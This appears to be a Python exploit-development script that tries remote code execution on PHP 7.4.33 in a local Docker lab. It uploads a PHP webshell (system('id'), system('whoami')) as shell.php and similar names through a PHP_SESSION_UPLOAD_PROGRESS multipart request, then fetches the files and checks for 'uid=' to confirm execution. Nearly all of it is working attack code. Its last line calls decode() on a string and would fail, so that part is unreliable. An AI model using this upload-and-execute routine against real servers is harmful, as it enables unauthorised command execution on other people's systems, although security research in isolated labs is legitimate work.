"""Try file upload RCE on 7.4.33.
Upload a PHP file via multipart form (1.8MB limit allows it).
If the file lands in /var/www/html/, we can execute it.
Also try: can we upload to a writable directory and include it?"""
import sys, os, time, struct
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E

URL = "http://127.0.0.1:18108/"

# PHP payload
PAYLOAD = b"<?php system('id'); echo \"\\n\"; system('whoami'); echo \"\\n\"; ?>"

def upload_and_check(filename):
    t = E.Target(URL, timeout=60.0, verbose=False)
    # Multipart with a file upload
    parts = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": filename, "data": PAYLOAD},
    ]
    try:
        resp = t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=60.0)
        print(f"  upload {filename}: response={len(resp)}B", flush=True)
        print(f"  resp[:200]: {resp[:200]}", flush=True)
    except Exception as e:
        print(f"  upload {filename}: ERROR {e}", flush=True)

print("=== 7.4.33 file upload test ===", flush=True)
upload_and_check("shell.php")
upload_and_check("test.php")
upload_and_check("pwn.php")

# Now try to access the uploaded file
print("\n=== Trying to access uploaded files ===", flush=True)
import urllib.request
for fname in ["shell.php", "test.php", "pwn.php", "files/shell.php"]:
    try:
        resp = urllib.request.urlopen(f"{URL}{fname}", timeout=10)
        body = resp.read()
        print(f"  {fname}: {resp.status} {len(body)}B", flush=True)
        if b"uid=" in body:
            print(f"  *** RCE! {body[:200]}", flush=True)
    except Exception as e:
        print(f"  {fname}: {e}", flush=True)

# Check /tmp for uploaded files
print("\n=== Checking /tmp for uploaded files ===", flush=True)
r = os.popen('docker exec p2s7433 sh -c "ls -la /tmp/php* 2>/dev/null; ls -la /var/www/html/ 2>/dev/null"').read()
print(r.decode(), flush=True)
